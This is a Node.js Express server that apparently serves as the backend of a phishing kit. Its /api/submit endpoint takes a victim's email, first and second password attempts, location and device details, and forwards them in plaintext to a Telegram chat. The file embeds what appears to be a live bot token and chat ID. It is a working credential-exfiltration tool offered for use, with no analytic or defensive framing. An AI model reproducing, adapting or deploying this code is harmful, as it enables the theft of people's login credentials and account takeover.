const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();

console.log('🚀 Starting Telegram Bot Server...');

// Configuration - YOU NEED TO SET THESE!
const CONFIG = {
  PORT: process.env.PORT || 3000,
  TELEGRAM: {
    BOT_TOKEN: '8346330872:AAF8YEtXWPZaRZQhIHgnaG7pXg7Lyaf30aw', // Get from @BotFather
    CHAT_ID: '5546373743'      // Your personal chat ID
  }
};

// Middleware
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// Handle preflight requests
app.options('*', cors());

// Function to send Telegram message
const sendTelegramMessage = async (message) => {
  try {
    const url = `https://api.telegram.org/bot${CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`;
    
    const response = await axios.post(url, {
      chat_id: CONFIG.TELEGRAM.CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    });

    console.log('✅ Telegram message sent!');
    return { success: true, messageId: response.data.result.message_id };
    
  } catch (error) {
    console.error('❌ Telegram error:', error.response?.data || error.message);
    throw new Error(`Telegram failed: ${error.response?.data?.description || error.message}`);
  }
};

// Test endpoint - Send test message to Telegram
app.get('/api/test-telegram', async (req, res) => {
  console.log('🧪 Testing Telegram bot...');
  
  try {
    const testMessage = `
🤖 <b>BOT TEST SUCCESSFUL!</b>

✅ Your Telegram bot is working!
🕐 Time: ${new Date().toLocaleString()}
🌐 Server: Render.com

If you receive this, your bot configuration is correct!
    `;

    const result = await sendTelegramMessage(testMessage);
    
    res.json({
      success: true,
      message: 'Test message sent to Telegram!',
      messageId: result.messageId,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    console.error('❌ Test failed:', error.message);
    res.status(500).json({
      success: false,
      error: error.message,
      help: 'Check your BOT_TOKEN and CHAT_ID configuration'
    });
  }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  console.log('🏥 Health check requested');
  res.json({ 
    status: 'OK', 
    message: 'Telegram Bot Server is running',
    timestamp: new Date().toISOString(),
    endpoints: {
      '/api/health': 'Health check',
      '/api/test-telegram': 'Test Telegram bot',
      '/api/submit': 'Main submission endpoint'
    }
  });
});

// Main endpoint - Send credentials to Telegram
app.post('/api/submit', async (req, res) => {
  console.log('📨 Received submission request');
  console.log('Request body:', JSON.stringify(req.body, null, 2));
  
  try {
    const { 
      email,
      firstpasswordused,
      secondpasswordused,
      country = 'Not detected',
      continent = 'Not detected',
      city = 'Not detected',
      device = {}
    } = req.body;

    // Validate required fields
    if (!email) {
      return res.status(400).json({
        success: false,
        error: 'Email is required'
      });
    }

    // Determine which password was used
    const passwordUsed = firstpasswordused || secondpasswordused;
    const attemptType = firstpasswordused ? 'FIRST' : 'SECOND';

    if (!passwordUsed) {
      return res.status(400).json({
        success: false,
        error: 'Password is required'
      });
    }

    console.log(`📱 Sending to Telegram: ${email}`);
    console.log(`🔑 Password: ${'*'.repeat(passwordUsed.length)}`);
    console.log(`🎯 Attempt: ${attemptType}`);

    // Create formatted Telegram message
    const telegramMessage = `
🔐 <b>NEW LOGIN ATTEMPT</b>

📧 <b>Email:</b> <code>${email}</code>
🔑 <b>Password:</b> <code>${passwordUsed}</code>
🎯 <b>Attempt:</b> ${attemptType}

🌍 <b>Location Info</b>
📍 IP Location: ${city}, ${country}, ${continent}

💻 <b>Device Info</b>
🖥️ User Agent: ${device.userAgent || 'Not available'}
🌐 Language: ${device.language || 'Not available'}
📱 Platform: ${device.platform || 'Not available'}
📲 Mobile: ${device.mobile ? 'Yes' : 'No'}

⏰ <b>Time:</b> ${new Date().toLocaleString()}
🆔 <b>Server:</b> Render.com
    `;

    // Send to Telegram
    const telegramResult = await sendTelegramMessage(telegramMessage);
    
    console.log('✅ Credentials sent to Telegram successfully!');

    res.json({
      success: true,
      message: 'Data received and sent to Telegram successfully',
      telegramMessageId: telegramResult.messageId,
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('❌ Error processing request:', error);
    
    res.status(500).json({
      success: false,
      error: error.message,
      details: 'Check Telegram bot configuration'
    });
  }
});

// Catch-all for undefined routes
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    error: 'Route not found',
    path: req.originalUrl
  });
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('🚨 Unhandled error:', error);
  res.status(500).json({
    success: false,
    error: 'Internal server error',
    message: error.message
  });
});

// Start server
app.listen(CONFIG.PORT, () => {
  console.log(`🎉 Telegram Bot Server started on port ${CONFIG.PORT}`);
  console.log(`📍 Health check: https://server-gfhv.onrender.com/api/health`);
  console.log(`📍 Telegram test: https://server-gfhv.onrender.com/api/test-telegram`);
  console.log('🤖 Waiting for Telegram configuration...');
});
